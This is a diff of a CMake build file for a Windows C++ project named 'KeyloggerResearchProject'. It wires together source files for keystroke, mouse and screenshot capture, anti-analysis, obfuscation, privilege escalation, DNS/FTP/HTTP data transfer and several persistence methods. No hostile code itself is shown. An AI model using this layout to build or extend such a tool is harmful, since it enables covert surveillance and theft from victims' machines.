@@ -1,46 +1,85 @@
+cmake_minimum_required(VERSION 3.15)
+project(KeyloggerResearchProject)
+
+set(CMAKE_CXX_STANDARD 17)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+
+# Windows-specific settings
+if(WIN32)
+    add_definitions(-DWIN32 -D_WINDOWS -D_UNICODE -DUNICODE)
+    set(CMAKE_WINDOWS_EXPORT_ALL_SYMBOLS ON)
+endif()
+
+# Include directories
+include_directories(
+    include
+    include/core
+    include/data
+    include/hooks
+    include/security
+    include/utils
+    include/communication
+    include/persistence
+)
+
 # Find Windows SDK
-include(FindPackageHandleStandardArgs)
+find_package(WindowsSDK REQUIRED)
+include_directories(${WINDOWSSDK_INCLUDE_DIRS})
 
-find_path(WINDOWSSDK_INCLUDE_DIR
-    NAMES windows.h
-    PATHS
-    "$ENV{ProgramFiles}/Windows Kits/10/Include/*/um"
-    "$ENV{ProgramFiles(x86)}/Windows Kits/10/Include/*/um"
-    CMAKE_FIND_ROOT_PATH_BOTH
+# Find additional dependencies
+find_package(Crypto REQUIRED)
+include_directories(${CRYPTO_INCLUDE_DIRS})
+
+# Source files
+set(SOURCES
+    src/main.cpp
+    src/core/Application.cpp
+    src/core/Configuration.cpp
+    src/core/Logger.cpp
+    src/data/DataManager.cpp
+    src/data/KeyData.cpp
+    src/data/Screenshot.cpp
+    src/data/SystemData.cpp
+    src/hooks/KeyHook.cpp
+    src/hooks/MouseHook.cpp
+    src/hooks/SystemHook.cpp
+    src/security/AntiAnalysis.cpp
+    src/security/Encryption.cpp
+    src/security/Obfuscation.cpp
+    src/security/PrivilegeEscalation.cpp
+    src/utils/FileUtils.cpp
+    src/utils/StringUtils.cpp
+    src/utils/SystemUtils.cpp
+    src/utils/TimeUtils.cpp
+    src/communication/CommsManager.cpp
+    src/communication/DnsComms.cpp
+    src/communication/FtpComms.cpp
+    src/communication/HttpComms.cpp
+    src/persistence/PersistenceManager.cpp
+    src/persistence/RegistryPersistence.cpp
+    src/persistence/SchedulePersistence.cpp
+    src/persistence/ServicePersistence.cpp
 )
 
-find_library(WINDOWSSDK_LIBRARY
-    NAMES kernel32 user32 advapi32
-    PATHS
-    "$ENV{ProgramFiles}/Windows Kits/10/Lib/*/um/x86"
-    "$ENV{ProgramFiles(x86)}/Windows Kits/10/Lib/*/um/x86"
-    CMAKE_FIND_ROOT_PATH_BOTH
+# Add executable
+add_executable(KeyloggerResearchProject ${SOURCES})
+
+# Link libraries
+target_link_libraries(KeyloggerResearchProject
+    ${WINDOWSSDK_LIBRARIES}
+    ${CRYPTO_LIBRARIES}
+    winhttp
+    wininet
+    dnsapi
+    taskschd
+    psapi
+    iphlpapi
+    gdiplus
+    shlwapi
+    ole32
+    oleaut32
+    uuid
 )
 
-find_package_handle_standard_args(WindowsSDK
-    REQUIRED_VARS WINDOWSSDK_INCLUDE_DIR WINDOWSSDK_LIBRARY
-)
-
-if(WindowsSDK_FOUND)
-    set(WINDOWSSDK_INCLUDE_DIRS ${WINDOWSSDK_INCLUDE_DIR})
-    set(WINDOWSSDK_LIBRARIES ${WINDOWSSDK_LIBRARY})
-endif()
-
-# Find Crypto libraries
-find_path(CRYPTO_INCLUDE_DIR
-    NAMES wincrypt.h
-    PATHS ${WINDOWSSDK_INCLUDE_DIR}
-)
-
-find_library(CRYPTO_LIBRARY
-    NAMES advapi32.lib crypt32.lib
-)
-
-find_package_handle_standard_args(Crypto
-    REQUIRED_VARS CRYPTO_INCLUDE_DIR CRYPTO_LIBRARY
-)
-
-if(CRYPTO_FOUND)
-    set(CRYPTO_INCLUDE_DIRS ${CRYPTO_INCLUDE_DIR})
-    set(CRYPTO_LIBRARIES ${CRYPTO_LIBRARY})
-endif()
+# Copy configuration files
+file(COPY resources/config/default.cfg DESTINATION ${CMAKE_BINARY_DIR})
